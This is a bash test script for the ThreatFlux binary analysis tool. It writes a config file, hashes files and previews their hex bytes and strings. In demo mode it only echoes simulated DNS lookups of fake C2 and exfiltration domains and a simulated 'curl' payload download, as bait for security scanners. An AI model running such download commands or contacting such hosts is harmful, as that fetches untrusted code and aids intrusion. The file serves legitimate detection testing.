#!/bin/bash

# ThreatFlux Binary Analysis - Test Shell Script
# This script demonstrates various shell operations for testing script analysis

set -e  # Exit on error

# Global variables
SCRIPT_NAME="ThreatFlux Test Script"
VERSION="1.0.0"
LOG_FILE="/tmp/threatflux_test.log"
CONFIG_DIR="$HOME/.threatflux"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Functions
print_banner() {
    echo -e "${BLUE}"
    echo "=================================================="
    echo "  $SCRIPT_NAME v$VERSION"
    echo "  Binary Analysis Test Environment"
    echo "=================================================="
    echo -e "${NC}"
}

log_message() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

check_dependencies() {
    log_message "INFO" "Checking system dependencies..."
    
    local deps=("gcc" "python3" "objdump" "hexdump" "file")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        else
            log_message "DEBUG" "Found dependency: $dep"
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log_message "WARN" "Missing dependencies: ${missing[*]}"
        echo -e "${YELLOW}Warning: Missing dependencies: ${missing[*]}${NC}"
    else
        log_message "INFO" "All dependencies satisfied"
        echo -e "${GREEN}All dependencies found${NC}"
    fi
}

setup_environment() {
    log_message "INFO" "Setting up test environment..."
    
    # Create config directory
    if [ ! -d "$CONFIG_DIR" ]; then
        mkdir -p "$CONFIG_DIR"
        log_message "INFO" "Created config directory: $CONFIG_DIR"
    fi
    
    # Create test configuration
    cat > "$CONFIG_DIR/test_config.conf" << EOF
# ThreatFlux Test Configuration
[analysis]
max_file_size = 100MB
timeout = 300
verbose = true

[output]
format = json
include_metadata = true
include_hashes = true

[security]
sandbox_enabled = true
network_monitoring = true
behavioral_analysis = false

[database]
host = localhost
port = 5432
database = threatflux_test
user = analyzer
# password = stored_in_keyring
EOF
    
    log_message "INFO" "Configuration written to $CONFIG_DIR/test_config.conf"
}

simulate_analysis() {
    local target_file="$1"
    
    if [ -z "$target_file" ]; then
        log_message "ERROR" "No target file specified"
        return 1
    fi
    
    if [ ! -f "$target_file" ]; then
        log_message "ERROR" "Target file not found: $target_file"
        return 1
    fi
    
    log_message "INFO" "Starting analysis of: $target_file"
    
    # File information
    local file_size=$(stat -f%z "$target_file" 2>/dev/null || stat -c%s "$target_file" 2>/dev/null)
    local file_type=$(file "$target_file")
    
    echo -e "${BLUE}File Analysis Results:${NC}"
    echo "File: $target_file"
    echo "Size: $file_size bytes"
    echo "Type: $file_type"
    
    # Hash calculation
    if command -v md5sum &> /dev/null; then
        local md5_hash=$(md5sum "$target_file" | cut -d' ' -f1)
        echo "MD5: $md5_hash"
        log_message "INFO" "MD5 hash calculated: $md5_hash"
    elif command -v md5 &> /dev/null; then
        local md5_hash=$(md5 -q "$target_file")
        echo "MD5: $md5_hash"
        log_message "INFO" "MD5 hash calculated: $md5_hash"
    fi
    
    # Hex dump preview
    echo -e "\n${BLUE}Hex dump (first 64 bytes):${NC}"
    if command -v hexdump &> /dev/null; then
        hexdump -C "$target_file" | head -4
    fi
    
    # String extraction
    echo -e "\n${BLUE}Strings preview:${NC}"
    if command -v strings &> /dev/null; then
        strings "$target_file" | head -10
    fi
    
    log_message "INFO" "Analysis completed for: $target_file"
}

# Suspicious operations (for testing security analysis)
simulate_network_activity() {
    log_message "WARN" "Simulating network activity..."
    
    # These would be flagged by security tools
    local suspicious_domains=(
        "malware-c2.example.com"
        "data-exfil.badsite.net"
        "backdoor.suspicious.org"
    )
    
    for domain in "${suspicious_domains[@]}"; do
        echo "[SIMULATED] nslookup $domain"
        log_message "WARN" "Simulated DNS lookup: $domain"
    done
    
    # Simulate downloading
    echo "[SIMULATED] curl -s http://suspicious-payload.net/download"
    log_message "WARN" "Simulated payload download attempt"
}

cleanup() {
    log_message "INFO" "Cleaning up temporary files..."
    
    # Remove temporary files (but keep logs)
    if [ -f "/tmp/threatflux_temp.dat" ]; then
        rm -f "/tmp/threatflux_temp.dat"
        log_message "INFO" "Removed temporary data file"
    fi
    
    echo -e "${GREEN}Cleanup completed${NC}"
}

main() {
    print_banner
    
    # Setup signal handlers
    trap cleanup EXIT
    trap 'log_message "ERROR" "Script interrupted"; exit 1' INT TERM
    
    log_message "INFO" "Script started with arguments: $*"
    
    check_dependencies
    setup_environment
    
    if [ $# -gt 0 ]; then
        for file in "$@"; do
            simulate_analysis "$file"
            echo ""
        done
    else
        echo -e "${YELLOW}Usage: $0 <file1> [file2] ...${NC}"
        echo "No files specified, running demo mode..."
        simulate_network_activity
    fi
    
    log_message "INFO" "Script execution completed"
    echo -e "${GREEN}All operations completed successfully${NC}"
}

# Script entry point
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi